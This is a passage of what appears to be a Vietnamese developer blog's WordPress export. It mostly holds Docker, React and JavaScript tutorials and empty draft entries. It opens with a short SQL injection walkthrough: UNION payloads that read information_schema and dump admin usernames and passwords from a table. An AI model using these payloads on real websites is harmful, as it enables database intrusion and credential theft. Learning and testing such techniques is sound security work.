# SELECT * FROM tblsanpham WHERE status=1 AND title LIKE '%may tho%' UNION SELECT 1,2,3,4 -- %'

// Tiếp tục đổi từng field để lấy thêm thông tin Database
may tho%' UNION SELECT 1,Database(),3,4,5,6,@@version,8,9,10,11,12,13,14,15,16 -- 

// Lấy danh sách các table_name trong database
may tho%' UNION SELECT 1,Database(),3,4,5,6,table_name,8,9,10,11,12,13,14,15,16 FROM information_schema.tables -- 

// Lấy danh sách các column_name trong một table (ví dụ table có tên 'tbladmin')
may tho%' UNION SELECT 1,Database(),3,4,5,6,column_name,8,9,10,11,12,13,14,15,16 FROM information_schema.columns WHERE table_name='tbladmin' -- 

// Lấy danh sách bản ghi trong table 'tbladmin'
may tho%' UNION SELECT 1,name,3,4,5,6,pass,8,9,10,11,12,13,14,15,16 FROM tbladmin -- 

// Lấy nhiều hơn
may tho%' UNION SELECT 1,name,3,4,5,6,pass,8,9,10,11,12,13,14,15,16 FROM tbladmin UNION SELECT 1,role,3,4,5,6,status,8,9,10,11,12,13,14,15,16 FROM tbladmin -- 


</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2245</wp:post_id>
		<wp:post_date><![CDATA[2022-05-27 13:54:11]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-27 06:54:11]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-27 17:11:50]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-27 10:11:50]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[sql-injection]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="sql"><![CDATA[SQL]]></category>
						</item>
					<item>
		<title><![CDATA[Docker – 6: Thực hành với PHP]]></title>
		<link>https://duycode.com/2022/06/06/docker-6-thuc-hanh-voi-php/</link>
		<pubDate>Mon, 06 Jun 2022 13:10:44 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2257</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Chuẩn bị</h2>
-- Lấy các images về
<pre>
// fpm là dịch vụ tạo ra nhiều tiến trình có sẵn
docker pull php:7.3-fpm
docker pull httpd
docker pull mysql

// Tạo 1 network dùng chung cho các container: www-net
docker network create --driver bridge www-net
docker network ls
</pre>

-- Tạo thư mục: C:\Docker\mycode sẽ làm bộ nhớ cho các container

-- Tạo file test C:\Docker\mycode\www\test.php
<pre>
<?php
    echo "ApacheHTTPD";
    phpinfo();
</pre>

<h2>2. Tạo container: c-php tự động lắng nghe trên cổng 9000</h2>
<pre>
// Tạo container: -d: chạy nền luôn ( khác với -it: chạy và vào terminal)
docker run -d --name c-php -h php -v C:\Docker\mycode:/home/mycode --network www-net php:7.3-fpm

// Vào container và chạy thử bash
docker exec -it c-php bash
# php --version
# cd /home/mycode/www
# php test.php

// Cài thêm lệnh ping
# apt update
# apt install iputils-ping

// Kiểm tra các extension được nạp cùng php
# php -m
// Cài thêm extension cho php chạy được mysql
# docker-php-ext-install mysqli
# docker-php-ext-install pdo_mysql
# exit

docker restart c-php
</pre>

<h2>3. Tạo container c-httpd</h2>
-- 3.1. Copy file cấu hình của httpd
<pre>
docker run --rm -v C:\Docker\mycode:/home/mycode httpd cp /usr/local/apache2/conf/httpd.conf /home/mycode
</pre>

-- 3.2. Sửa file C:\Docker\mycode\httpd.conf để sử dụng proxy trong apache
<pre>
// Bỏ comment những đoạn sau
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_fcgi_module modules/mod_proxy_fcgi.so

// thêm vào cuối file
AddHandler "proxy:fcgi://c-php:9000" .php

// Đổi thư mục làm việc mặc định
# DocumentRoot "/usr/local/apache2/htdocs"
# <Directory "/usr/local/apache2/htdocs">

// Khởi động bằng file index.php
<IfModule dir_module>
    DirectoryIndex index.html index.php
</IfModule>

DocumentRoot "/home/mycode/www"
<Directory "/home/mycode/www">
</pre>

-- 3.3 Tạo container
<pre>
docker run --network www-net --name c-httpd -h httpd -p 9999:80 -p 443:443 -v C:\Docker\mycode:/home/mycode/ -v C:\Docker\mycode\httpd.conf:/usr/local/apache2/conf/httpd.conf httpd
</pre>

-- *Dùng trình duyệt truy cập http://localhost:9999 và http://localhost:9999/test.php để xem kết quả

<h2>4. Tạo container c-mysql tự động lắng nghe trên cổng 3306</h2>
-- 4.1. Copy file cấu hình của mysql
<pre>
docker run --rm -v C:\Docker\mycode:/home/mycode mysql cp /etc/mysql/my.cnf /home/mycode/
</pre>

-- 4.2. Sửa file cấu hình C:\Docker\mycode\my.cnf để hoạt động với phiên bản mysql xác thực cũ
<pre>
// Thêm vào cuối file
default-authentication-plugin=mysql_native_password
</pre>

-- 4.3. Tạo thư mục C:/Docker/mycode/db => mục đích để lưu db vào đó, nếu lỡ xóa container mysql thì vẫn còn db

-- 4.4. Tạo container
<pre>
docker run -e MYSQL_ROOT_PASSWORD=abc123 -v C:\Docker\mycode\my.cnf:/etc/mysql/my.cnf -v C:\Docker\mycode\db:/var/lib/mysql --name c-mysql mysql
docker network connect www-net c-mysql

// Test thử c-mysql hoạt động
docker exec -it c-mysql bash

// Kết nối tới database với root@abc123
# mysql -uroot -pabc123
mysql> SHOW DATABASES
mysql> USE mysql;
mysql> SHOW TABLES;

// Tạo user và db mới
mysql> CREATE DATABASE wp_wordpress;
mysql> CREATE USER 'testuser'@'%' IDENTIFIED BY 'testpass';

// Cấp toàn quyền cho user
mysql> GRANT ALL PRIVILEGES ON wp_wordpress.* TO 'testuser'@'%';
mysql> FLUSH PRIVILEGES;
mysql> exit

// Kết nối lại bằng testuser
# mysql -utestuser -ptestpass
mysql> SHOW DATABASES
</pre>

<h2>5. Sử dụng Wordpress</h2>
- Download mã nguồn từ trang chủ: <a href="https://wordpress.org/download/" rel="noopener" target="_blank">https://wordpress.org/download/</a>
- Đưa toàn bộ source code wordpress vào C:\Docker\mycode\www
- Vào trình duyệt: http://localhost:9999/index.php
- Bắt đầu cài đặt worpress với thông số
<pre>
Database Name: wp_wordpress
Username: testuser
Password: testpass	
Database Host: c_mysql
Table Prefix: wp_
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2257</wp:post_id>
		<wp:post_date><![CDATA[2022-06-06 20:10:44]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-06-06 13:10:44]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-06-17 06:03:52]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-06-16 23:03:52]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[docker-6-thuc-hanh-voi-php]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						</item>
					<item>
		<title><![CDATA[ReactJS - Other]]></title>
		<link>https://duycode.com/2022/06/08/reactjs-other/</link>
		<pubDate>Wed, 08 Jun 2022 03:55:59 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2259</guid>
		<description></description>
		<content:encoded><![CDATA[- React Portal: dùng khi tạo Modal hoặc tooltip --> thẻ div đứng ngang #root]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2259</wp:post_id>
		<wp:post_date><![CDATA[2022-06-08 10:55:59]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-06-08 03:55:59]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-06-08 10:55:59]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-06-08 03:55:59]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[reactjs-other]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[Docker – 7: Create Image and Dockerfile]]></title>
		<link>https://duycode.com/2022/05/15/docker-7-create-image-and-dockerfile/</link>
		<pubDate>Sun, 15 May 2022 00:00:09 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2281</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Tạo 1 image từ 1 container</h2>
-- Tạo 1 container tên cent từ image centos
<pre>
docker pull centos:centos7
docker run -it --name cent centos:centos7
# yum update -y
# yum install httpd httpd-tools -y
# yum install vim -y
# yum install epel-release -y
# yum update -y
# yum install htop -y
// Kiểm tra xem đã cài hoàn thành httpd, vim và htop chưa
# httpd -v
# vi
# htop
// Ctrl + P + Q để ra khỏi container

docker cp C:\Docker\mycode\myimage\test.html cent:/var/www/html/
docker attach cent
# cd /var/www/html
# ls
# exit
</pre>

-- Commit container cent thành image có tên myimage:v1
<pre>
docker commit cent myimage:v1
docker images
// Tạo luôn 1 container chạy máy chủ httpd và chạy nền
docker run --rm -p 9876:80 myimage:v1 httpd -D FOREGROUND
</pre>

<h2>2. Tạo image từ Dockerfile</h2>
-- Tạo file
<pre>
cd C:\Docker\mycode\myimage
// Tạo Dockerfile trên PowerShell
New-Item Dockerfile
// Tạo Dockerfile trên Linux
touch Dockerfile
</pre>

-- Chỉnh sửa Dockerfile
<pre>
FROM centos:centos7

RUN yum update -y
RUN yum install httpd httpd-tools -y
RUN yum install vim -y
RUN yum install epel-release -y
RUN yum update -y
RUN yum install htop -y

# Thư mục làm việc mặc định
WORKDIR /var/www/html
# Image này hoạt động và lắng nghe trên cổng 80
EXPOSE 80

# Copy file test html vào thư mục var/www/html
ADD ./test.html /var/www/html/

# Container được tạo mặc định sẽ chạy httpd với tham số -D FOREGROUND
ENTRYPOINT [ "httpd" ]
CMD [ "-D", "FOREGROUND" ]
</pre>
-- Tạo image từ Dockerfile
<pre>
# -t: tên image, -f: tên file, .: thư mục hiện tại
docker build -t myimage:v1 -f Dockerfile .
# Kiểm tra lại image
docker image history myimage:v1
# Tạo thử 1 container
docker run -p 6789:80 myimage:v1
</pre>


<h2> * Khác. Lưu 1 container thành 1 Images</h2>
<pre>
// Tạo 1 container dựa trên image: ubuntu:18.04
$ sudo docker run -it --name "TestUbuntu" ubuntu:18.04

// Khởi động bash trong ubuntu
$ sudo docker exec -it TestUbuntu bash
// Cài đặt htop
root@testubuntu:/# apt update -y
root@testubuntu:/# apt install htop
root@testubuntu:/# htop

// Cài đặt Ping, Vim
root@testubuntu:/# apt install iputils-ping
root@testubuntu:/# apt install vim

// Container này đang cài đặt khá nhiều chương trình rồi -> cần lưu container này lại
// Tạo 1 images my-ubuntu:version1 từ container TestUbuntu
$ sudo docker commit TestUbuntu my-ubuntu:version1

// Kiểm tra lại các images của dọcker
$ sudo docker images

// Lưu image thành 1 file my-ubuntu.tar
$ cd ~/Downloads
$ sudo docker save --output my-ubuntu.tar e03f35874101

// Tạo image từ file tar
$ sudo docker load -i my-ubuntu.tar

// Đặt lại tên và version
$ docker tag e03f35874101 my-ubuntu:version2
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2281</wp:post_id>
		<wp:post_date><![CDATA[2022-05-15 07:00:09]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-15 00:00:09]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-06-17 06:08:25]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-06-16 23:08:25]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[docker-7-create-image-and-dockerfile]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						</item>
					<item>
		<title><![CDATA[Docker - 8. Example docker-compose]]></title>
		<link>https://duycode.com/2022/05/15/docker-8-example-docker-compose/</link>
		<pubDate>Sun, 15 May 2022 01:00:25 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2293</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Chuẩn bị</h2>
- Tạo folder chia sẻ dữ liệu: C:\Docker\mycode
<pre>
.
├── ...
├── mycode
│    ├── db                         // thư mục lưu trữ dữ liệu
│    ├── php
│    │    └── Dockerfile            // Tạo image php có 1 vài chỉnh sửa từ image: php:7.3-fpm
│    ├── sites
│    │    └── site1                 // Nơi lưu trữ website
│    │         ├── index.php
│    ├── docker-compose.yml 
│    ├── httpd.conf                 // file config của http (tạo bằng cách trích xuất từ image)
│    ├── my.cnf                     // file config mysql    (tạo bằng cách trích xuất từ image)
</pre>

<h3>1. File \mycode\php\Dockerfile</h3>
- Tạo image php có 1 vài chỉnh sửa từ image: php:7.3-fpm
<pre>
FROM php:7.3-fpm

RUN docker-php-ext-install mysqli
RUN docker-php-ext-install pdo_mysql

WORKDIR /home/site/site1
</pre>

<h3>2. Trích xuất file \mycode\httpd.conf</h3>
<pre>
docker run --rm -v C:\Docker\mycode\:/home/ httpd cp /usr/local/apache2/conf/httpd.conf /home/
</pre>
- Chỉnh sửa file httpd.conf
<pre>
// Bỏ comment những đoạn sau
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_fcgi_module modules/mod_proxy_fcgi.so
 
// Đổi thư mục làm việc mặc định
DocumentRoot "/home/sites/site1"
<Directory "/home/sites/site1">
 
// Khởi động bằng file index.php
<IfModule dir_module>
    DirectoryIndex index.html index.php
</IfModule>

// thêm vào cuối file
AddHandler "proxy:fcgi://c-php:9000" .php
</pre>

<h3>3. Trích xuất file \mycode\my.cnf</h3>
<pre>
docker run --rm -v C:\Docker\mycode\:/home/ mysql cp /etc/mysql/my.cnf /home/
</pre>
- Sửa để xác thực theo native password
<pre>
// Thêm vào cuối file
default-authentication-plugin=mysql_native_password
</pre>

<h2>2. File \mycode\docker-compose</h2>
<pre>
version: "3"

networks:
  my-network: # tên network
    driver: bridge

volumes:
  dir-site: # tên volume
    driver: local
    driver_opts:
      device: C:\Docker\mycode\sites # đường dẫn trên máy host: /mycode/sites
      type: none
      o: bind

services:
  # container PHP
  my-php:  # tên service
    container_name: php-product # tên container
    build:  # image lấy từ Dockerfile build ra
      dockerfile: Dockerfile
      context: ./php/ # đường dẫn bắt đầu từ file docker-compose
    hostname: php
    restart: always
    networks:
      - my-network
    volumes:
      - dir-site:/home/sites # ổ đĩa dir-site ánh xạ vào thư mục /home/site

  # container HTTPD
  my-httpd:
    container_name: c-httpd01
    image: "httpd:latest"
    hostname: httpd
    restart: always
    networks:
      - my-network
    volumes:
      - dir-site:/home/sites/ # ổ đĩa dir-site ánh xạ vào thư mục /home/site
      - ./httpd.conf:/usr/local/apache2/conf/httpd.conf # ánh xạ file config
    ports:
      - "9999:80" # http://localhost:9999
      - "443:443" # https://localhost:443

  # container MYSQL
  my-mysql:
    container_name: mysql-product
    image: "mysql:latest"
    hostname: mysql
    restart: always
    networks:
      - my-network
    volumes:
      - ./db:/var/lib/mysql # database sẽ được lưu lại ở folder db
      - ./my.cnf:/etc/mysql/my.cnf # ánh xạ file config
    environment:
      - MYSQL_ROOT_PASSWORD=123abc
      - MYSQL_DATABASE=db_site
      - MYSQL_USER=siteuser
      - MYSQL_PASSWORD=sitepass

</pre>

<h2>3. Run</h2>
<pre>
docker-compose ps
docker-compose ps --service

docker-compose up
docker-compose up --build

// Dừng và xóa container, network
docker-compose down
docker-compose down -v --remove-orphans

docker-compose stop
docker-compose start
docker-compose restart

docker-compose images

// Thực hiện lệnh bash trong service my-php
docker-compose exec my-php bash

// Đọc log tất cả
docker-compose logs
// Đọc log ở service my-php và service my-httpd
docker-compose logs my-php my-httpd
</pre>

]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2293</wp:post_id>
		<wp:post_date><![CDATA[2022-05-15 08:00:25]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-15 01:00:25]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-06-19 17:29:45]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-06-19 10:29:45]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[docker-8-example-docker-compose]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						</item>
					<item>
		<title><![CDATA[Debounce và Throttle trong JavaScript]]></title>
		<link>https://duycode.com/2022/07/27/debounce-va-throttle-trong-javascript/</link>
		<pubDate>Wed, 27 Jul 2022 03:23:15 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2317</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Debounce</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<body>
    <button id="btn-debounce">Button Debounce</button>
    <script>
        const debounce = (func, delay) => {
            let timeout;
            return (...args) => {
                if (timeout) {
                    clearTimeout(timeout);
                }
                timeout = setTimeout(() => {
                    func(...args);
                    timeout = null;
                }, delay);
            };
        };

        const senDataDebounce = debounce((data) => {
            console.log('Send data debounce:', data);
        }, 1000);

        document.getElementById('btn-debounce').onclick = () => {
            senDataDebounce(new Date())
        }
    </script>
</body>

</html>
</pre>
<h2>2. Throttle</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<body>
    <button id="btn-throttle">Button Throttle</button>
    <script>
        const throttle = (func, delay) => {
            let lastCall = 0;

            return function (...args) {
                const now = new Date().getTime();

                if (now - lastCall >= delay) {
                    lastCall = now;
                    return func(...args);
                }
            };
        }

        const senDataThrottle = throttle((data) => {
            console.log('Send data throttle:', data);
        }, 1000);

        document.getElementById('btn-throttle').onclick = () => {
            senDataThrottle(new Date())
        }
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2317</wp:post_id>
		<wp:post_date><![CDATA[2022-07-27 03:23:15]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-07-27 03:23:15]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-07-27 03:23:22]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-07-27 03:23:22]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[debounce-va-throttle-trong-javascript]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Auto Draft]]></title>
		<link>https://duycode.com/?p=2327</link>
		<pubDate>Fri, 29 Jul 2022 13:34:21 +0000</pubDate>
		<dc:creator><![CDATA[]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2327</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2327</wp:post_id>
		<wp:post_date><![CDATA[2022-07-29 13:34:21]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-07-29 13:34:21]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-07-29 13:34:21]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-07-29 13:34:21]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[__trashed]]></wp:post_name>
		<wp:status><![CDATA[trash]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="languages"><![CDATA[Languages]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_trash_meta_status]]></wp:meta_key>
		<wp:meta_value><![CDATA[auto-draft]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_trash_meta_time]]></wp:meta_key>
		<wp:meta_value><![CDATA[1659101661]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_desired_post_slug]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Auto Draft]]></title>
		<link>https://duycode.com/?p=2329</link>
		<pubDate>Fri, 29 Jul 2022 13:36:42 +0000</pubDate>
		<dc:creator><![CDATA[]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2329</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2329</wp:post_id>
		<wp:post_date><![CDATA[2022-07-29 13:36:42]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-07-29 13:36:42]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-07-29 13:36:42]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-07-29 13:36:42]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[__trashed-2]]></wp:post_name>
		<wp:status><![CDATA[trash]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="languages"><![CDATA[Languages]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_trash_meta_status]]></wp:meta_key>
		<wp:meta_value><![CDATA[auto-draft]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_trash_meta_time]]></wp:meta_key>
		<wp:meta_value><![CDATA[1659101802]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_desired_post_slug]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Auto Draft]]></title>
		<link>https://duycode.com/?p=2331</link>
		<pubDate>Fri, 29 Jul 2022 13:38:37 +0000</pubDate>
		<dc:creator><![CDATA[]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2331</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2331</wp:post_id>
		<wp:post_date><![CDATA[2022-07-29 13:38:37]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-07-29 13:38:37]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-07-29 13:38:37]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-07-29 13:38:37]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[__trashed-3]]></wp:post_name>
		<wp:status><![CDATA[trash]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="languages"><![CDATA[Languages]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_trash_meta_status]]></wp:meta_key>
		<wp:meta_value><![CDATA[auto-draft]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_trash_meta_time]]></wp:meta_key>
		<wp:meta_value><![CDATA[1659101917]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_desired_post_slug]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Auto Draft]]></title>
		<link>https://duycode.com/?p=2333</link>
		<pubDate>Fri, 29 Jul 2022 13:43:54 +0000</pubDate>
		<dc:creator><![CDATA[]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2333</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2333</wp:post_id>
		<wp:post_date><![CDATA[2022-07-29 13:43:54]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-07-29 13:43:54]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-07-29 13:43:54]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-07-29 13:43:54]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[__trashed-4]]></wp:post_name>
		<wp:status><![CDATA[trash]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="languages"><![CDATA[Languages]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_trash_meta_status]]></wp:meta_key>
		<wp:meta_value><![CDATA[auto-draft]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_trash_meta_time]]></wp:meta_key>
		<wp:meta_value><![CDATA[1659102234]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_desired_post_slug]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Auto Draft]]></title>
		<link>https://duycode.com/?p=2337</link>
		<pubDate>Fri, 29 Jul 2022 14:15:53 +0000</pubDate>
		<dc:creator><![CDATA[]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2337</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2337</wp:post_id>
		<wp:post_date><![CDATA[2022-07-29 14:15:53]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-07-29 14:15:53]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-07-29 14:15:53]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-07-29 14:15:53]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[__trashed-5]]></wp:post_name>
		<wp:status><![CDATA[trash]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="languages"><![CDATA[Languages]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_trash_meta_status]]></wp:meta_key>
		<wp:meta_value><![CDATA[auto-draft]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_trash_meta_time]]></wp:meta_key>
